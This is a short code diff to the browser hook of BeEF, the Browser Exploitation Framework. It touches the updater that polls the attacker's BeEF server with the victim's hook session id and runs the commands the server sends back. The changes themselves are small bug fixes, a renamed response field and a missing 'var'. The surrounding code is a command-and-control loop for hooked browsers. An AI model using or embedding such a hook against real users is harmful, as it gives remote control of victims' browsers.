@@ -59,7 +59,7 @@ beef.updater = {
 		try {
 			this.lock = true;
             beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, beef.updater.beefhook+'='+beef.session.get_hook_session_id(), 5, 'script', function(response) {
-                if (response.body != null && response.body.length > 0)
+                if (response.response_body != null && response.response_body.length > 0)
                     beef.updater.execute_commands();
             });
 		} catch(e) {
@@ -76,7 +76,7 @@ beef.updater = {
 		if(beef.commands.length == 0) return;
 		this.lock = true;
 		while(beef.commands.length > 0) {
-			command = beef.commands.pop();
+			var command = beef.commands.pop();
 			try {
 				command();
 			} catch(e) {
